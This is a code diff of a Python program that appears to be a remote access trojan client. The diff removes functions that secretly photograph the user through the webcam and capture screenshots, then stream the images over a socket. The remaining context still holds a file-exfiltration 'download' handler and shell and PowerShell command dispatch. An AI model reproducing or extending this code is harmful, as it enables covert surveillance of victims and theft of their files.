@@ -1,26 +1,8 @@
 import os
 import socket
 import subprocess
-import cv2
 import random
-from PIL import ImageGrab
-from io import BytesIO
 import sys
-
-
-def webcam_pic(s,data):
-     cam_port = 0
-     cam = cv2.VideoCapture(cam_port)
-     result, image = cam.read()
-     filename=str(random.choice(range(100)))+".png"
-     if result: 
-          cv2.imwrite(filename, image) 
-     with open(filename, "rb") as file:
-          while data := file.read(1024):
-               s.send(data)
-     s.send(str.encode("Sended"))
-     cam.release()
-     os.remove(filename)
 
 
 def download(s,data):
@@ -29,24 +11,11 @@ def download(s,data):
           while data := file.read(1024):
               s.sendall(data)
 
-
-def screenshot(s,data):
-     buffer=BytesIO()
-     screenshot = ImageGrab.grab()
-     screenshot.save(buffer,format="PNG")
-     buffer.seek(0)
-     while data := buffer.read(1024):
-          s.send(data)
-     s.send(str.encode("Sended"))
           
           
 def cmd(s,data):
      if data[:2].decode("utf-8")=="cd":
           cd(s,data)
-     elif data[:2].decode("utf-8")=="ss":
-          screenshot(s,data)
-     elif data[:6].decode("utf-8")=="webcam":
-          webcam_pic(s,data)
      elif data[:8].decode("utf-8")=="download":
           download(s,data)
      else:
@@ -65,10 +34,6 @@ def cd(s,data):
 def powershell(s,data):
      if data[:2].decode("utf-8")=="cd":
           cd(s,data)
-     elif data[:2].decode("utf-8")=="ss":
-          screenshot(s,data)
-     elif data[:6].decode("utf-8")=="webcam":
-          webcam_pic(s,data)
      elif data[:8].decode("utf-8")=="download":
           download(s,data)
      else:
